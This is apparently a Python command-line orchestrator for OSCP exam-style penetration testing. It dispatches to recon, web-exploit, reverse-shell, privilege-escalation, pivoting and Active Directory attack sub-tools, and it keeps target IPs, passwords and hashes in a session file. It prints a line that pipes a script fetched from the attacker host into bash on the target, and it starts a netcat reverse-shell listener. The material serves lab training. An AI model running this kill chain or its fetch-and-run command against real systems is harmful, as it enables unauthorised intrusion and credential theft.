#!/usr/bin/env python3
# Self-activate project venv before any other imports.
# Works whether called directly, via symlink, or as `python3 killchain.py`.
import os as _os, sys as _sys
_venv = _os.path.join(_os.path.dirname(_os.path.realpath(__file__)), ".venv", "bin", "python3")
if _os.path.exists(_venv) and _os.path.abspath(_sys.executable) != _os.path.abspath(_venv):
    _os.execv(_venv, [_venv] + _sys.argv)

"""
killchain — OSCP Kill Chain Orchestrator

Single entry point for all tools. Maintains a session state
(target IP, attacker IP, domain, creds) so you never repeat yourself.

Usage:
  killchain session set target 10.10.10.5
  killchain recon
  killchain shell -l bash
  killchain ad chain "user>GenericAll>svc_sql>DCSync>corp.local"

Session stored at ~/.oscp_session.json
"""

import argparse
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

# ─── Paths ────────────────────────────────────────────────────────────────────
BASE = Path(__file__).resolve().parent
SESSION_FILE = Path.home() / ".oscp_session.json"

TOOLS = {
    "recon":    BASE / "Recon"    / "recon.py",
    "fruit":    BASE / "Recon"    / "fruitpicker.py",
    "web":      BASE / "Recon"    / "webrecon.py",
    "test":     BASE / "Recon"    / "webtester.py",
    "lfi":      BASE / "Recon"    / "lfi_scan.py",
    "xfind":    BASE / "Recon"    / "xfind.py",
    "shell":    BASE / "RevShell" / "revshell.py",
    "privesc":  BASE / "PrivEsc"  / "privesc.py",
    "pe":       BASE / "PrivEsc"  / "privesc.sh",
    "pivot":    BASE / "Pivot"    / "pivot.py",
    "ad":       BASE / "ADchain"  / "adchain.py",
    "report":   BASE / "Report"   / "report.py",
    "scope":    BASE / "PrivEsc"  / "scope.sh",
    "tools":    BASE / "PrivEsc"  / "toolbox.sh",
}

# ─── Colors ───────────────────────────────────────────────────────────────────
if os.isatty(1):
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    CYN = "\033[96m"; MAG = "\033[95m"; BLD = "\033[1m"
    DIM = "\033[2m";  RST = "\033[0m"
else:
    RED = GRN = YEL = CYN = MAG = BLD = DIM = RST = ""

COFFEE = r"""
         ((((
        ((((
         ))))
      _ .---.
     ( |`---'|
      \|     |
      : .___, :
       `-----'"""

def banner():
    print(f"\n{BLD}{CYN}═══════════════════════════════════════{RST}")
    print(f"  {BLD}KILLCHAIN{RST}")
    print(f"{BLD}{CYN}═══════════════════════════════════════{RST}")
    print(f"{DIM}{COFFEE}{RST}\n")

def err(msg):
    print(f"  {RED}[!]{RST} {msg}", file=sys.stderr)

def ok(msg):
    print(f"  {GRN}[+]{RST} {msg}")

def info(msg):
    print(f"  {DIM}[*]{RST} {msg}")

# ─── Session ──────────────────────────────────────────────────────────────────
def load_session() -> dict:
    if SESSION_FILE.exists():
        try:
            return json.loads(SESSION_FILE.read_text())
        except Exception:
            pass
    return {}

def save_session(sess: dict):
    SESSION_FILE.write_text(json.dumps(sess, indent=2))

def detect_attacker_ip() -> str:
    for iface in ("tun0", "tun1", "eth0", "ens33", "ens160", "wlan0"):
        try:
            out = subprocess.check_output(
                ["ip", "addr", "show", iface], stderr=subprocess.DEVNULL, text=True
            )
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("inet ") and "/" in line:
                    return line.split()[1].split("/")[0]
        except Exception:
            pass
    return ""

def cmd_session(args):
    sess = load_session()

    if args.session_cmd == "show" or args.session_cmd is None:
        print(f"\n  {BLD}{CYN}═══ Session ═══{RST}")
        keys = ["target", "attacker", "domain", "user", "password", "hash", "dc_ip"]
        for k in keys:
            v = sess.get(k, "")
            label = f"{YEL}{k:<12}{RST}" if v else f"{DIM}{k:<12}{RST}"
            value = f"{BLD}{v}{RST}" if v else f"{DIM}not set{RST}"
            print(f"    {label} = {value}")
        print()

    elif args.session_cmd == "set":
        key, val = args.key, args.value
        if key == "attacker" and val == "auto":
            val = detect_attacker_ip()
            if not val:
                err("Could not auto-detect attacker IP — is VPN connected?")
                return 1
        sess[key] = val
        save_session(sess)
        ok(f"Set {key} = {val}")

    elif args.session_cmd == "clear":
        save_session({})
        ok("Session cleared")

    elif args.session_cmd == "auto":
        ip = detect_attacker_ip()
        if ip:
            sess["attacker"] = ip
            save_session(sess)
            ok(f"Attacker IP auto-detected: {BLD}{ip}{RST}")
        else:
            err("Could not detect IP — is VPN up?")
            return 1

    return 0

# ─── Run a sub-tool ───────────────────────────────────────────────────────────
def run_tool(tool_path: Path, extra_args: list, is_bash: bool = False):
    if not tool_path.exists():
        err(f"Tool not found: {tool_path}")
        return 1
    if is_bash:
        cmd = ["bash", str(tool_path)] + extra_args
    else:
        cmd = [sys.executable, str(tool_path)] + extra_args
    return subprocess.call(cmd)

def session_defaults(sess: dict) -> dict:
    """Return flags that tools accept, populated from session where set."""
    return {k: v for k, v in sess.items() if v}

# ─── Sub-commands ─────────────────────────────────────────────────────────────

def cmd_recon(args):
    sess = load_session()
    target = args.target or sess.get("target")
    if not target:
        err("No target — run: killchain session set target <IP>")
        return 1
    extra = [target]
    if args.output:
        extra += ["-o", args.output]
    extra += args.extra
    return run_tool(TOOLS["recon"], extra)

def cmd_fruit(args):
    sess = load_session()
    target = args.target or sess.get("target")
    if not target:
        err("No target — run: killchain session set target <IP>")
        return 1
    return run_tool(TOOLS["fruit"], [target] + args.extra)

def cmd_web(args):
    sess = load_session()
    url = args.url or (f"http://{sess.get('target')}" if sess.get("target") else None)
    if not url:
        err("No URL — provide one or set: killchain session set target <IP>")
        return 1
    return run_tool(TOOLS["web"], [url] + args.extra)

def cmd_test(args):
    sess = load_session()
    url = args.url or (f"http://{sess.get('target')}" if sess.get("target") else None)
    if not url:
        err("No URL — provide one or set: killchain session set target <IP>")
        return 1
    return run_tool(TOOLS["test"], [args.mode, url] + args.extra)

def cmd_lfi(args):
    if not args.url:
        err("Provide URL with FUZZ placeholder, e.g. http://10.0.0.1/page?file=FUZZ")
        return 1
    return run_tool(TOOLS["lfi"], [args.url] + args.extra, is_bash=True)

def cmd_xfind(args):
    return run_tool(TOOLS["xfind"], args.extra)

def cmd_shell(args):
    sess = load_session()
    extra = list(args.extra)
    if "-i" not in extra and "--ip" not in extra:
        attacker = sess.get("attacker") or detect_attacker_ip()
        if attacker:
            extra = ["-i", attacker] + extra
    if "-l" not in extra and "--listener" not in extra and args.type:
        extra = ["-l", args.type] + extra
    if "-p" not in extra and "--port" not in extra and args.port:
        extra = ["-p", str(args.port)] + extra
    return run_tool(TOOLS["shell"], extra)

def cmd_privesc(args):
    return run_tool(TOOLS["privesc"], args.extra)

def cmd_pe(args):
    """Print/copy the privesc.sh script path for upload to target."""
    path = TOOLS["pe"]
    ok(f"Upload this to target:")
    print(f"\n    {BLD}{path}{RST}")
    print()
    sess = load_session()
    attacker = sess.get("attacker") or detect_attacker_ip()
    if attacker:
        info("Serve it with:")
        print(f"\n    {CYN}cd {BASE}/PrivEsc && python3 -m http.server 80{RST}")
        print(f"\n    {CYN}curl http://{attacker}/privesc.sh | bash{RST}")
        print()
    return 0

def cmd_pivot(args):
    return run_tool(TOOLS["pivot"], args.extra)

def cmd_ad(args):
    sess = load_session()
    extra = list(args.extra)
    # Inject session defaults if not already provided
    if "-d" not in extra and "--domain" not in extra and sess.get("domain"):
        extra += ["--domain", sess["domain"]]
    if "--dc" not in extra and sess.get("dc_ip"):
        extra += ["--dc", sess["dc_ip"]]
    if "-u" not in extra and "--user" not in extra and sess.get("user"):
        extra += ["-u", sess["user"]]
    if "-p" not in extra and "--password" not in extra and sess.get("password"):
        extra += ["-p", sess["password"]]
    if "-H" not in extra and "--hash" not in extra and sess.get("hash"):
        extra += ["-H", sess["hash"]]
    return run_tool(TOOLS["ad"], extra)

def cmd_report(args):
    return run_tool(TOOLS["report"], args.extra)

def cmd_scope(args):
    path = TOOLS["scope"]
    if not path.exists():
        err(f"scope.sh not found at {path}")
        return 1
    print(f"\n  {BLD}scope.sh must be sourced, not run as a subprocess:{RST}")
    print(f"\n    {CYN}source {path} setup{RST}")
    print(f"    {CYN}source {path} show{RST}")
    print(f"    {CYN}source {path} add T1 10.10.10.5 BoxName{RST}")
    print()
    return 0

def cmd_tools(args):
    return run_tool(TOOLS["tools"], args.extra, is_bash=True)

def cmd_listen(args):
    """Start a reverse shell listener using penelope, falling back to nc."""
    port = args.port or 4444

    print(f"\n{BLD}{CYN}═══════════════════════════════════════{RST}")
    print(f"  {BLD}LISTEN  port {port}{RST}")
    print(f"{BLD}{CYN}═══════════════════════════════════════{RST}\n")

    # Find penelope: PATH first, then oscp-tools download location
    pen_cmd = None
    pen_bin = shutil.which("penelope")
    if pen_bin:
        pen_cmd = [pen_bin, str(port)]
    else:
        pen_py = Path.home() / "oscp-tools" / "misc" / "penelope.py"
        if pen_py.exists():
            pen_cmd = [sys.executable, str(pen_py), str(port)]

    if pen_cmd:
        info(f"Starting penelope listener on port {port}")
        print(f"    {DIM}→ {' '.join(str(x) for x in pen_cmd)}{RST}\n")
        return subprocess.call(pen_cmd)
    else:
        err(f"penelope not found — falling back to nc")
        info("Get penelope: killchain tools  (downloads ~/oscp-tools/misc/penelope.py)")
        print()
        nc_bin = shutil.which("nc") or shutil.which("ncat") or "nc"
        cmd = [nc_bin, "-lvnp", str(port)]
        info(f"Running: {' '.join(cmd)}")
        print(f"\n  {BLD}{YEL}Once you catch a shell — stabilize it:{RST}")
        print(f"    {DIM}1.{RST} {CYN}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'{RST}")
        print(f"    {DIM}2.{RST} {CYN}Ctrl+Z{RST}")
        print(f"    {DIM}3.{RST} {CYN}stty raw -echo; fg{RST}")
        print(f"    {DIM}4.{RST} {CYN}export TERM=xterm COLUMNS=220 ROWS=50{RST}")
        print()
        return subprocess.call(cmd)

def cmd_workflow(args):
    """Print the recommended OSCP kill chain workflow."""
    sess = load_session()
    target = sess.get("target", "<TARGET>")
    attacker = sess.get("attacker") or detect_attacker_ip() or "<ATTACKER>"
    domain = sess.get("domain", "<DOMAIN>")

    print(f"\n  {BLD}{CYN}═══ OSCP Kill Chain Workflow ═══{RST}")
    print()
    steps = [
        ("1. Setup",          f"killchain session set target {target}\n    killchain session auto"),
        ("2. Recon",          f"killchain recon {target} -o ./recon/\n    killchain fruit {target}"),
        ("3. Web",            f"killchain web http://{target}\n    killchain test sqli http://{target}/page?id=1\n    killchain lfi 'http://{target}/page?file=FUZZ'"),
        ("4. Exploit Search", f"killchain xfind nmap ./recon/{target}.nmap"),
        ("5. Shell",          f"killchain listen 4444             # start penelope listener\n    killchain shell -l bash -p 4444  # generate payload"),
        ("6. PrivEsc (Lin)",  f"killchain pe  # then upload privesc.sh to target"),
        ("7. PrivEsc (Win)",  f"killchain privesc cheatsheet -os windows"),
        ("8. Pivot",          f"killchain pivot ligolo --agent-ip {target} --local-port 11601"),
        ("9. AD",             f"killchain ad cheatsheet\n    killchain ad chain 'user>GenericAll>svc_sql>DCSync>{domain}'"),
        ("10. Report",        f"killchain report add '{target}' {target}\n    killchain report flag {target} local\n    killchain report generate"),
    ]
    for title, cmd in steps:
        print(f"  {BLD}{YEL}{title}{RST}")
        for line in cmd.split("\n"):
            print(f"    {CYN}{line}{RST}")
        print()
    return 0

def cmd_list(args):
    """List all available tools."""
    banner()
    print(f"  {BLD}Available tools:{RST}\n")
    descriptions = {
        "session": "Manage session state (target, attacker IP, creds)",
        "recon":   "Full port scan + service enum (recon.py)",
        "fruit":   "Quick win checker — finds low-hanging fruit",
        "web":     "Web recon — headers, tech stack, dirs, secrets",
        "test":    "Web exploit tester — sqli, cmdi, lfi, upload",
        "lfi":     "LFI scanner with ffuf integration",
        "xfind":   "Searchsploit + CVE + GitHub exploit search",
        "shell":   "Reverse shell generator (30+ types)",
        "privesc": "Windows/Linux privesc cheatsheet + checker",
        "pe":      "Get privesc.sh path for upload to target",
        "pivot":   "Pivot command generator (Ligolo, Chisel, SSH)",
        "ad":      "BloodHound attack chain runner",
        "report":  "OSCP report generator (Markdown → PDF)",
        "listen":  "Start penelope listener (falls back to nc)",
        "scope":   "Scope/IP env manager (must be sourced)",
        "tools":   "Download all OSCP tools to ~/oscp-tools/",
        "workflow":"Print the recommended kill chain workflow",
    }
    for name, desc in descriptions.items():
        print(f"    {CYN}{name:<12}{RST} {desc}")
    print()
    print(f"  {DIM}Run 'killchain <tool> --help' for tool-specific options{RST}")
    print(f"  {DIM}Run 'killchain workflow' to see the full kill chain{RST}")
    print()
    return 0

# ─── Argument Parser ──────────────────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(
        prog="killchain",
        description="OSCP Kill Chain Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Run 'killchain workflow' to see the full kill chain.\nRun 'killchain <tool> --help' for tool options.",
    )
    sub = p.add_subparsers(dest="cmd")

    # session
    s = sub.add_parser("session", help="Manage session state")
    ss = s.add_subparsers(dest="session_cmd")
    ss.add_parser("show", help="Show current session")
    ss.add_parser("clear", help="Clear session")
    ss.add_parser("auto", help="Auto-detect attacker IP from tun0")
    sp = ss.add_parser("set", help="Set a session variable")
    sp.add_argument("key", choices=["target","attacker","domain","user","password","hash","dc_ip"])
    sp.add_argument("value")

    # recon
    r = sub.add_parser("recon", help="Full recon (recon.py)")
    r.add_argument("target", nargs="?", help="Target IP (default: session target)")
    r.add_argument("-o", "--output", help="Output directory")
    r.add_argument("extra", nargs=argparse.REMAINDER)

    # fruit
    f = sub.add_parser("fruit", help="Quick win checker (fruitpicker.py)")
    f.add_argument("target", nargs="?", help="Target IP (default: session target)")
    f.add_argument("extra", nargs=argparse.REMAINDER)

    # web
    w = sub.add_parser("web", help="Web recon (webrecon.py)")
    w.add_argument("url", nargs="?", help="Target URL (default: http://session_target)")
    w.add_argument("extra", nargs=argparse.REMAINDER)

    # test
    t = sub.add_parser("test", help="Web exploit tester (webtester.py)")
    t.add_argument("mode", choices=["sqli","cmdi","lfi","upload","payloads"], help="Test mode")
    t.add_argument("url", nargs="?", help="Target URL")
    t.add_argument("extra", nargs=argparse.REMAINDER)

    # lfi
    lfi = sub.add_parser("lfi", help="LFI scanner (lfi_scan.sh)")
    lfi.add_argument("url", nargs="?", help="URL with FUZZ placeholder")
    lfi.add_argument("extra", nargs=argparse.REMAINDER)

    # xfind
    x = sub.add_parser("xfind", help="Exploit search (xfind.py)")
    x.add_argument("extra", nargs=argparse.REMAINDER)

    # shell
    sh = sub.add_parser("shell", help="Reverse shell generator (revshell.py)")
    sh.add_argument("-l", "--type", dest="type", help="Shell type (bash, python, php, ...)")
    sh.add_argument("-p", "--port", default="4444", help="Listener port")
    sh.add_argument("extra", nargs=argparse.REMAINDER)

    # privesc
    pe = sub.add_parser("privesc", help="Privesc cheatsheet (privesc.py)")
    pe.add_argument("extra", nargs=argparse.REMAINDER)

    # pe (upload helper)
    sub.add_parser("pe", help="Print path to privesc.sh for upload to target")

    # pivot
    pv = sub.add_parser("pivot", help="Pivot command generator (pivot.py)")
    pv.add_argument("extra", nargs=argparse.REMAINDER)

    # ad
    ad = sub.add_parser("ad", help="AD attack chain runner (adchain.py)")
    ad.add_argument("extra", nargs=argparse.REMAINDER)

    # report
    rp = sub.add_parser("report", help="Report generator (report.py)")
    rp.add_argument("extra", nargs=argparse.REMAINDER)

    # scope
    sub.add_parser("scope", help="Scope manager (scope.sh — must be sourced)")

    # listen
    li = sub.add_parser("listen", help="Start reverse shell listener (penelope or nc fallback)")
    li.add_argument("port", nargs="?", type=int, default=4444, help="Port to listen on (default: 4444)")

    # tools
    tl = sub.add_parser("tools", help="Download all OSCP tools (toolbox.sh)")
    tl.add_argument("extra", nargs=argparse.REMAINDER)

    # workflow
    sub.add_parser("workflow", help="Print the recommended kill chain workflow")

    # list / help
    sub.add_parser("list", help="List all available tools")

    return p

DISPATCH = {
    "session":  cmd_session,
    "recon":    cmd_recon,
    "fruit":    cmd_fruit,
    "web":      cmd_web,
    "test":     cmd_test,
    "lfi":      cmd_lfi,
    "xfind":    cmd_xfind,
    "shell":    cmd_shell,
    "privesc":  cmd_privesc,
    "pe":       cmd_pe,
    "pivot":    cmd_pivot,
    "ad":       cmd_ad,
    "report":   cmd_report,
    "scope":    cmd_scope,
    "listen":   cmd_listen,
    "tools":    cmd_tools,
    "workflow": cmd_workflow,
    "list":     cmd_list,
}

def main():
    p = build_parser()
    args = p.parse_args()

    if not args.cmd:
        banner()
        p.print_help()
        return 0

    fn = DISPATCH.get(args.cmd)
    if fn is None:
        err(f"Unknown command: {args.cmd}")
        return 1

    return fn(args) or 0

if __name__ == "__main__":
    sys.exit(main())
